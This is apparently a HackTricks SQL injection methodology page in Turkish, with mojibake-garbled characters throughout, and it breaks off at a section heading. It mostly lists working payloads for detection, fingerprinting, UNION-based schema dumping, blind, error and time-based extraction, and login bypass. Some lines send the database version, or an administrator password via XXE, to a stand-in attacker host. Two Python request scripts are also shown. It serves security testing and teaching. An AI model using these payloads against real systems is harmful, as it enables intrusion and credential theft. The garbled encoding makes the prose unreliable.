# SQL Injection

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) Ä°spanya'daki en Ã¶nemli siber gÃ¼venlik etkinliÄŸi ve Avrupa'daki en Ã¶nemli etkinliklerden biridir. Teknik bilginin yayÄ±lmasÄ±nÄ± amaÃ§layan bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

## SQL enjeksiyonu nedir?

Bir **SQL enjeksiyonu**, bir uygulamanÄ±n veritabanÄ± sorgularÄ±na **mÃ¼dahale etmeyi** saÄŸlayan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu zafiyet, saldÄ±rganlarÄ±n, eriÅŸmemeleri gereken diÄŸer kullanÄ±cÄ±larÄ±n bilgileri veya uygulamanÄ±n eriÅŸebileceÄŸi herhangi bir veri dahil olmak Ã¼zere eriÅŸmemeleri gereken verileri **gÃ¶rÃ¼ntÃ¼lemelerine**, **deÄŸiÅŸtirmelerine** veya **silmelerine** olanak tanÄ±r. Bu tÃ¼r eylemler, uygulamanÄ±n iÅŸlevselliÄŸi veya iÃ§eriÄŸi Ã¼zerinde kalÄ±cÄ± deÄŸiÅŸikliklere veya hatta sunucunun veya hizmetin kullanÄ±lamaz hale gelmesine neden olabilir.


## GiriÅŸ noktasÄ± tespiti

Bir site, SQL enjeksiyonuna (SQLi) karÅŸÄ± **savunmasÄ±z gÃ¶rÃ¼nÃ¼yorsa**, SQLi ile ilgili giriÅŸlere alÄ±ÅŸÄ±lmadÄ±k sunucu yanÄ±tlarÄ± nedeniyle, **ilk adÄ±m**, sorguya **mÃ¼dahale etmeden veri enjekte etmeyi** nasÄ±l anlayacaÄŸÄ±mÄ±zÄ± Ã¶ÄŸrenmektir. Bunun iÃ§in mevcut baÄŸlamdan **etkili bir ÅŸekilde kaÃ§Ä±nma yÃ¶ntemini** belirlemek gerekmektedir.
Ä°ÅŸte bazÄ± faydalÄ± Ã¶rnekler:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
ArdÄ±ndan, sorguyu **hatalarÄ± dÃ¼zeltmek iÃ§in nasÄ±l dÃ¼zelteceÄŸinizi** bilmelisiniz. Sorguyu dÃ¼zeltmek iÃ§in yeni verileri **giriÅŸ yapabilirsiniz**, veya sadece **kendi verilerinizi girebilir** ve **sonuna bir yorum sembolÃ¼ ekleyebilirsiniz**.

_Not edin ki, hata mesajlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z veya bir sorgu Ã§alÄ±ÅŸÄ±rken ve Ã§alÄ±ÅŸmadÄ±ÄŸÄ± zaman farklÄ±lÄ±klarÄ± fark edebiliyorsanÄ±z, bu aÅŸama daha kolay olacaktÄ±r._

### **Yorumlar**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### MantÄ±ksal iÅŸlemlerle doÄŸrulama

Bir SQL enjeksiyon aÃ§Ä±ÄŸÄ± doÄŸrulamak iÃ§in gÃ¼venilir bir yÃ¶ntem, bir **mantÄ±ksal iÅŸlem** gerÃ§ekleÅŸtirip beklenen sonuÃ§larÄ± gÃ¶zlemlemektir. Ã–rneÄŸin, `?username=Peter` gibi bir GET parametresi, `?username=Peter' or '1'='1` ÅŸeklinde deÄŸiÅŸtirildiÄŸinde aynÄ± iÃ§eriÄŸi Ã¼retiyorsa, bu bir SQL enjeksiyon aÃ§Ä±ÄŸÄ±na iÅŸaret eder.

Benzer ÅŸekilde, **matematiksel iÅŸlemlerin** uygulanmasÄ± etkili bir doÄŸrulama tekniÄŸi olarak kullanÄ±labilir. Ã–rneÄŸin, `?id=1` ve `?id=2-1` eriÅŸimleri aynÄ± sonucu Ã¼retiyorsa, bu bir SQL enjeksiyonunun varlÄ±ÄŸÄ±nÄ± gÃ¶sterir.

MantÄ±ksal iÅŸlem doÄŸrulamasÄ±nÄ± gÃ¶steren Ã¶rnekler:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Bu kelime listesi, Ã¶nerilen yÃ¶ntemle SQL enjeksiyonlarÄ±nÄ± doÄŸrulamak iÃ§in oluÅŸturulmuÅŸtur:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Zamanlama ile DoÄŸrulama

BazÄ± durumlarda, test ettiÄŸiniz sayfada herhangi bir deÄŸiÅŸiklik fark etmeyebilirsiniz. Bu nedenle, kÃ¶r SQL enjeksiyonlarÄ±nÄ± keÅŸfetmenin iyi bir yolu, veritabanÄ±nÄ±n eylemler gerÃ§ekleÅŸtirmesini saÄŸlamak ve sayfanÄ±n yÃ¼klenme sÃ¼resine **etkisi olacak** bir iÅŸlemi SQL sorgusuna birleÅŸtirmektir.
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
BazÄ± durumlarda **sleep fonksiyonlarÄ±na izin verilmeyebilir**. Bu durumda, bu fonksiyonlarÄ± kullanmak yerine sorguyu **birkaÃ§ saniye sÃ¼recek karmaÅŸÄ±k iÅŸlemler gerÃ§ekleÅŸtiren** ÅŸekilde yapabilirsiniz. _Bu tekniklerin Ã¶rnekleri, her bir teknoloji iÃ§in ayrÄ± ayrÄ± aÃ§Ä±klanacaktÄ±r (varsa)_.

### Arka UÃ§ TanÄ±mlama

Arka ucu tanÄ±mlamanÄ±n en iyi yolu, farklÄ± arka uÃ§larÄ±n fonksiyonlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmayÄ± denemektir. Ã–nceki bÃ¶lÃ¼mdeki _**sleep**_ **fonksiyonlarÄ±nÄ±** veya bu tablodaki yÃ¶ntemleri kullanabilirsiniz ([payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification) tablosu):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
AyrÄ±ca, sorgunun Ã§Ä±ktÄ±sÄ±na eriÅŸiminiz varsa, **veritabanÄ±nÄ±n sÃ¼rÃ¼mÃ¼nÃ¼ yazdÄ±rabilirsiniz**.

{% hint style="info" %}
DevamÄ±nda farklÄ± tÃ¼rde SQL Injection'larÄ± sÃ¶mÃ¼rmek iÃ§in farklÄ± yÃ¶ntemleri tartÄ±ÅŸacaÄŸÄ±z. Ã–rnek olarak MySQL kullanacaÄŸÄ±z.
{% endhint %}

### PortSwigger ile Tespit Etme

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## BirleÅŸtirme TabanlÄ± SÃ¶mÃ¼rme

### SÃ¼tun SayÄ±sÄ±nÄ± Belirleme

EÄŸer sorgunun Ã§Ä±ktÄ±sÄ±nÄ± gÃ¶rebiliyorsanÄ±z, bunu sÃ¶mÃ¼rmek iÃ§in en iyi yol budur.\
Ä°lk olarak, **baÅŸlangÄ±Ã§ isteÄŸinin dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ sÃ¼tunlarÄ±n sayÄ±sÄ±nÄ±** bulmamÄ±z gerekiyor. Ã‡Ã¼nkÃ¼ **her iki sorgu da aynÄ± sayÄ±da sÃ¼tun dÃ¶ndÃ¼rmelidir**.\
Bu amaÃ§la genellikle iki yÃ¶ntem kullanÄ±lÄ±r:

#### SÄ±ralama/Gruplama ile

Bir sorgunun sÃ¼tun sayÄ±sÄ±nÄ± belirlemek iÃ§in, **ORDER BY** veya **GROUP BY** ifadelerinde kullanÄ±lan sayÄ±yÄ± artÄ±rarak yanÄ±t alÄ±namayana kadar ayarlayÄ±n. SQL iÃ§inde **GROUP BY** ve **ORDER BY**'Ä±n farklÄ± iÅŸlevleri olmasÄ±na raÄŸmen, her ikisi de sorgunun sÃ¼tun sayÄ±sÄ±nÄ± belirlemek iÃ§in aynÄ± ÅŸekilde kullanÄ±labilir.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Sorgu doÄŸru olana kadar daha fazla null deÄŸeri seÃ§in:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_`null` deÄŸerlerini kullanmalÄ±sÄ±nÄ±z Ã§Ã¼nkÃ¼ bazÄ± durumlarda sorgunun her iki tarafÄ±ndaki sÃ¼tunlarÄ±n tÃ¼rÃ¼ aynÄ± olmalÄ±dÄ±r ve null her durumda geÃ§erlidir._

### VeritabanÄ± adlarÄ±nÄ±, tablo adlarÄ±nÄ± ve sÃ¼tun adlarÄ±nÄ± Ã§Ä±karma

AÅŸaÄŸÄ±daki Ã¶rneklerde, tÃ¼m veritabanlarÄ±nÄ±n adÄ±nÄ±, bir veritabanÄ±nÄ±n tablo adÄ±nÄ± ve tablonun sÃ¼tun adlarÄ±nÄ± alacaÄŸÄ±z:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Her farklÄ± veritabanÄ±nda bu verileri keÅŸfetmek iÃ§in farklÄ± bir yÃ¶ntem vardÄ±r, ancak her zaman aynÄ± metodoloji kullanÄ±lÄ±r._

## Gizli BirleÅŸtirme TabanlÄ± SÃ¶mÃ¼rme

Bir sorgunun Ã§Ä±ktÄ±sÄ± gÃ¶rÃ¼nÃ¼rken birleÅŸtirme tabanlÄ± bir enjeksiyonun gerÃ§ekleÅŸtirilemez gibi gÃ¶rÃ¼nmesi, **gizli birleÅŸtirme tabanlÄ± bir enjeksiyonun** varlÄ±ÄŸÄ±nÄ± gÃ¶sterir. Bu senaryo genellikle kÃ¶r bir enjeksiyon durumuna yol aÃ§ar. KÃ¶r bir enjeksiyonu birleÅŸtirme tabanlÄ± bir enjeksiyona dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in, arka uÃ§ta yÃ¼rÃ¼tÃ¼len sorgunun belirlenmesi gerekmektedir.

Bu, hedef VeritabanÄ± YÃ¶netim Sistemi (DBMS) iÃ§in varsayÄ±lan tablolarla birlikte kÃ¶r enjeksiyon tekniklerinin kullanÄ±lmasÄ±yla gerÃ§ekleÅŸtirilebilir. Bu varsayÄ±lan tablolarÄ± anlamak iÃ§in, hedef DBMS'nin belgelerine baÅŸvurmanÄ±z Ã¶nerilir.

Sorgu Ã§Ä±karÄ±ldÄ±ktan sonra, orijinal sorguyu gÃ¼venli bir ÅŸekilde kapatmak iÃ§in payload'Ä±nÄ±zÄ± Ã¶zelleÅŸtirmeniz gerekmektedir. ArdÄ±ndan, payload'Ä±nÄ±za birleÅŸtirme sorgusu eklenir ve yeni eriÅŸilebilir birleÅŸtirme tabanlÄ± enjeksiyonun sÃ¶mÃ¼rÃ¼lmesi kolaylaÅŸtÄ±rÄ±lÄ±r.

Daha kapsamlÄ± bilgilere ulaÅŸmak iÃ§in [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f) adlÄ± tam makaleye baÅŸvurun.

## Hata TabanlÄ± SÃ¶mÃ¼rme

EÄŸer bir nedenden dolayÄ± **sorgunun Ã§Ä±ktÄ±sÄ±nÄ± gÃ¶remiyorsanÄ±z** ancak **hata mesajlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z**, bu hata mesajlarÄ±nÄ± kullanarak veritabanÄ±ndan veri **sÄ±zdÄ±rabilirsiniz**.\
BirleÅŸtirme tabanlÄ± sÃ¶mÃ¼rÃ¼de olduÄŸu gibi benzer bir akÄ±ÅŸÄ± takip ederek veritabanÄ±nÄ± dÃ¶kÃ¼mleyebilirsiniz.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## KÃ¶r SQLi SÃ¶mÃ¼rÃ¼sÃ¼

Bu durumda, sorgunun sonuÃ§larÄ±nÄ± veya hatalarÄ± gÃ¶remeseniz de, sorgunun doÄŸru bir yanÄ±t mÄ± yoksa yanlÄ±ÅŸ bir yanÄ±t mÄ± dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nÃ¼ **ayÄ±rt edebilirsiniz** Ã§Ã¼nkÃ¼ sayfada farklÄ± iÃ§erikler bulunur.\
Bu durumda, bu davranÄ±ÅŸÄ± istismar ederek veritabanÄ±nÄ± karakter karakter dÃ¶kÃ¼mleyebilirsiniz:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Hata TabanlÄ± SQLi SÃ¶mÃ¼rme

Bu, Ã¶ncekiyle aynÄ± durumdur, ancak sorgudan gelen doÄŸru/yalancÄ± yanÄ±tlarÄ± ayÄ±rt etmek yerine SQL sorgusunda bir hata olup olmadÄ±ÄŸÄ±nÄ± ayÄ±rt edebilirsiniz (belki de HTTP sunucusu Ã§Ã¶ktÃ¼ÄŸÃ¼ iÃ§in). Bu durumda, her doÄŸru tahmini yaptÄ±ÄŸÄ±nÄ±zda bir SQL hatasÄ± zorlayabilirsiniz:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Zaman Temelli SQLi SÃ¶mÃ¼rÃ¼sÃ¼

Bu durumda, sorgunun yanÄ±tÄ±nÄ± sayfanÄ±n baÄŸlamÄ±na gÃ¶re ayÄ±rt etmenin bir yolu **yoktur**. Ancak, tahmin edilen karakter doÄŸruysa sayfanÄ±n **daha uzun sÃ¼rede yÃ¼klenmesini saÄŸlayabilirsiniz**. Daha Ã¶nce [bir SQLi zafiyetini doÄŸrulamak iÃ§in](./#confirming-with-timing) bu teknik kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmÃ¼ÅŸtÃ¼k.
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## YÄ±ÄŸÄ±lmÄ±ÅŸ Sorgular

YÄ±ÄŸÄ±lmÄ±ÅŸ sorgularÄ± kullanarak **ardÄ±ÅŸÄ±k olarak birden fazla sorguyu yÃ¼rÃ¼tebilirsiniz**. Ä°kinci bir sorgu kullanarak DNS sorgusu, koÅŸullu hata veya zaman gecikmesi tetikleyebileceÄŸiniz **kÃ¶r zafiyetler** ile ilgili olarak bu teknik Ã¶ncelikle kullanÄ±ÅŸlÄ±dÄ±r. Ancak, ardÄ±ÅŸÄ±k sorgularÄ±n yÃ¼rÃ¼tÃ¼lmesine raÄŸmen, **sonuÃ§lar uygulamaya geri dÃ¶ndÃ¼rÃ¼lmez**.

**Oracle**, **yÄ±ÄŸÄ±lmÄ±ÅŸ sorgularÄ± desteklemez**. **MySQL, Microsoft** ve **PostgreSQL** ise destekler: `BURAYA-SORGU-1; BURAYA-SORGU-2`

## DÄ±ÅŸarÄ±dan SÃ¶mÃ¼rÃ¼

EÄŸer **baÅŸka bir** sÃ¶mÃ¼rÃ¼ yÃ¶ntemi **iÅŸe yaramazsa**, veritabanÄ±nÄ±n bilgileri sizin kontrolÃ¼nÃ¼zde olan **harici bir sunucuya** Ã§Ä±karmasÄ±nÄ± saÄŸlamayÄ± deneyebilirsiniz. Ã–rneÄŸin, DNS sorgularÄ± aracÄ±lÄ±ÄŸÄ±yla:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### XXE ile Veri SÄ±zdÄ±rma Yoluyla BaÄŸlantÄ± DÄ±ÅŸÄ± Veri Ã‡alma

XXE (XML External Entity) saldÄ±rÄ±sÄ±, bir web uygulamasÄ±nÄ±n XML iÅŸleme iÅŸlevselliÄŸini kÃ¶tÃ¼ye kullanarak hassas verilerin sÄ±zdÄ±rÄ±lmasÄ±na olanak tanÄ±r. Bu saldÄ±rÄ± tÃ¼rÃ¼, hedef uygulamanÄ±n dÄ±ÅŸarÄ±ya Ã§Ä±kÄ±ÅŸ yapmasÄ±na izin veren bir XXE zafiyeti bulunduÄŸunda kullanÄ±labilir.

Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan XML dÃ¶kÃ¼manÄ±na Ã¶zel bir dÄ±ÅŸ varlÄ±k (external entity) ekler. Bu dÄ±ÅŸ varlÄ±k, saldÄ±rganÄ±n kontrolÃ¼ndeki bir sunucuya veya hedef dÄ±ÅŸÄ±nda baÅŸka bir hedefe baÄŸlantÄ± kurabilir. SaldÄ±rgan, bu baÄŸlantÄ±yÄ± kullanarak hassas verileri hedef uygulamadan Ã§alabilir ve dÄ±ÅŸarÄ±ya aktarabilir.

XXE saldÄ±rÄ±sÄ±nÄ±n bir varyasyonu olan "Out of band data exfiltration" ise, verilerin hedef uygulama dÄ±ÅŸÄ±nda baÅŸka bir yolla Ã§alÄ±nmasÄ±nÄ± saÄŸlar. Bu yÃ¶ntemde, saldÄ±rgan, dÄ±ÅŸarÄ±ya Ã§Ä±kartÄ±lan verileri hedef uygulamadan baÄŸÄ±msÄ±z bir ÅŸekilde alabilir. Ã–rneÄŸin, saldÄ±rgan, Ã§alÄ±nan verileri kendi kontrolÃ¼ndeki bir sunucuya POST veya GET isteÄŸiyle gÃ¶nderebilir.

Bu saldÄ±rÄ± tÃ¼rÃ¼, hedef uygulamanÄ±n aÄŸa eriÅŸimi olmayan bir ortamda Ã§alÄ±ÅŸtÄ±ÄŸÄ± durumlarda kullanÄ±ÅŸlÄ± olabilir. AyrÄ±ca, hedef uygulamanÄ±n gÃ¼venlik Ã¶nlemleri tarafÄ±ndan tespit edilmesi daha zor olabilir.
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Otomatik SÃ¶mÃ¼rÃ¼

SQLi zafiyetini [**sqlmap**](https://github.com/sqlmapproject/sqlmap) ile sÃ¶mÃ¼rmek iÃ§in [SQLMap Hile SayfasÄ±](sqlmap/) kontrol edin.

## Teknik Ã¶zel bilgiler

SQL Injection zafiyetini sÃ¶mÃ¼rmek iÃ§in tÃ¼m yollarÄ± zaten tartÄ±ÅŸtÄ±k. Bu kitapta veritabanÄ± teknolojisine baÄŸlÄ± olarak daha fazla hile bulabilirsiniz:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Veya **MySQL, PostgreSQL, Oracle, MSSQL, SQLite ve HQL ile ilgili birÃ§ok hile** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) adresinde bulabilirsiniz.

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/), **Ä°spanya**'daki en ilgili siber gÃ¼venlik etkinliÄŸi ve **Avrupa**'nÄ±n en Ã¶nemli etkinliklerinden biridir. Teknik bilginin yayÄ±lmasÄ±nÄ± amaÃ§layan bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

## Kimlik doÄŸrulama atlatma

GiriÅŸ iÅŸlevselliÄŸini atlatmaya Ã§alÄ±ÅŸmak iÃ§in aÅŸaÄŸÄ±daki listeyi deneyin:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Ham hash kimlik doÄŸrulama Atlatma
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Bu sorgu, kimlik doÄŸrulama kontrollerinde MD5'in true ile kullanÄ±lmasÄ± durumunda ortaya Ã§Ä±kan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± sergiler. Sistem, SQL enjeksiyonuna karÅŸÄ± savunmasÄ±z hale gelir. SaldÄ±rganlar, giriÅŸleri Ã¶zel olarak oluÅŸturarak, karma iÅŸlemi sonucunda beklenmeyen SQL komut parÃ§alarÄ±nÄ±n oluÅŸmasÄ±nÄ± saÄŸlayabilir ve bu da yetkisiz eriÅŸime yol aÃ§abilir.
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### Enjekte edilmiÅŸ hash kimlik doÄŸrulamasÄ± Atlatma

Bu teknik, SQL enjeksiyonu kullanarak bir web uygulamasÄ±nda hash tabanlÄ± kimlik doÄŸrulamasÄ±nÄ± atlatmayÄ± amaÃ§lar. Hash tabanlÄ± kimlik doÄŸrulamasÄ±, kullanÄ±cÄ±larÄ±n parolalarÄ±nÄ± veritabanÄ±nda depolamak yerine, parolalarÄ±n hash deÄŸerlerini depolayarak gÃ¼venlik saÄŸlar. Ancak, bu teknik, saldÄ±rganÄ±n bir kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ±nÄ± atlatmasÄ±na olanak tanÄ±r.

Bu saldÄ±rÄ±, kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lan SQL sorgusuna bir SQL enjeksiyonu ekleyerek gerÃ§ekleÅŸtirilir. SaldÄ±rgan, kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ±nÄ± atlatmak iÃ§in bir hash deÄŸeri yerine bir SQL ifadesi enjekte eder. Bu, saldÄ±rganÄ±n istediÄŸi herhangi bir kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ±nÄ± atlatmasÄ±na olanak tanÄ±r.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rganÄ±n hedef web uygulamasÄ±nda SQL enjeksiyonu aÃ§Ä±ÄŸÄ± bulmasÄ± gerekir. SQL enjeksiyonu aÃ§Ä±ÄŸÄ± bulunduktan sonra, saldÄ±rgan, kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lan SQL sorgusuna bir SQL ifadesi enjekte ederek hash tabanlÄ± kimlik doÄŸrulamasÄ±nÄ± atlatÄ±r.

Bu saldÄ±rÄ±yÄ± Ã¶nlemek iÃ§in, web uygulamalarÄ±nÄ±n gÃ¼venli kodlama uygulamalarÄ±nÄ± takip etmesi ve kullanÄ±cÄ± giriÅŸlerini doÄŸru bir ÅŸekilde iÅŸlemesi Ã¶nemlidir. AyrÄ±ca, parametrelerin doÄŸru bir ÅŸekilde sorguya eklenmesi ve kullanÄ±cÄ± giriÅŸlerinin doÄŸrulanmasÄ± da Ã¶nemlidir.
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Ã–nerilen liste**:

Her satÄ±rÄ± kullanÄ±cÄ± adÄ± olarak kullanmalÄ±sÄ±nÄ±z ve her zaman ÅŸifre olarak: _**Pass1234.**_\
_(Bu payloadlar, bu bÃ¶lÃ¼mÃ¼n baÅŸÄ±nda bahsedilen bÃ¼yÃ¼k listede de bulunmaktadÄ±r)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Kimlik DoÄŸrulama Atlama

EÄŸer ' karakteri kaÃ§Ä±rÄ±lÄ±yorsa, %A8%27 kullanabilirsiniz ve ' karakteri kaÃ§Ä±rÄ±ldÄ±ÄŸÄ±nda ÅŸu ÅŸekilde oluÅŸturulur: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
```python
import requests

def sql_injection(url, payload):
    # Construct the SQL injection payload
    payload = f"' OR {payload} -- "

    # Send the request with the payload
    response = requests.get(url + payload)

    # Check if the response indicates a successful SQL injection
    if "Error" in response.text:
        print("SQL injection successful!")
    else:
        print("SQL injection failed.")

# Example usage
url = "https://example.com/login"
payload = "1=1"
sql_injection(url, payload)
```
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Poliglot enjeksiyon (Ã§oklu baÄŸlam)

